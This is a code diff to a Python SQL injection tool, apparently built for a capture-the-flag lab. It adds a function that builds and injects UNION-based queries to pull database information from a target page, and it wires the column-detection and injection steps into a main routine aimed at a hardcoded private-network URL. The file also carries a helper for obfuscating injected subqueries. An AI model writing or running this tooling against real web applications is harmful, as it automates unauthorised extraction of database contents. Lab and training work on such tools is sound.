@@ -36,7 +36,6 @@ def startup(page, param_string):
 
     return sqli 
 
-
 def num_columns(page, verbose):
     # Get column data for union statement
     
@@ -78,6 +77,23 @@ def visible_nums(page, num_cols, verbose):
         report = reporter.Reporter()
 
     return visible_nums
+
+def union_queries(page, query_params, num_cols, visible_nums, verbose):
+    """
+        :query_params: List of strings. Database-specific parameters to search for.
+    """
+
+    build = builder.Builder(page, query_params)
+    fang = injector.Injector(page, '')
+
+    queries = build.union(num_cols, visible_nums)
+    results = fang.injection(queries)
+
+    if verbose:
+        report = reporter.Reporter()
+        report.db_info(results)
+
+    return results
 
 def obfuscate_subquery(obfuscator, obfuscation, subquery):
     """ Takes subquery to obfuscate by encoding.
@@ -144,14 +160,15 @@ if __name__ == '__main__':
     #if len(sys.argv) > 3 and sys.argv[3] == 'string':
     #    page = page[:-1] + "'" + page[-1]
 
-    # Instantiate classes used
-    # CTF6
+    
     page = 'http://192.168.83.134/index.php?id=1'
     #page = 'http://192.168.83.130/cat.php?id=1'
 
+    
     num_cols = num_columns(page, False)
-    visible_nums = visible_nums(page, num_cols, False)
+    visible_num = int(visible_nums(page, num_cols, False)[0])
 
+    x = union_queries(page, mysql_params, num_cols, visible_num, True)
 
     """
     x = build.comparative_precomputation()
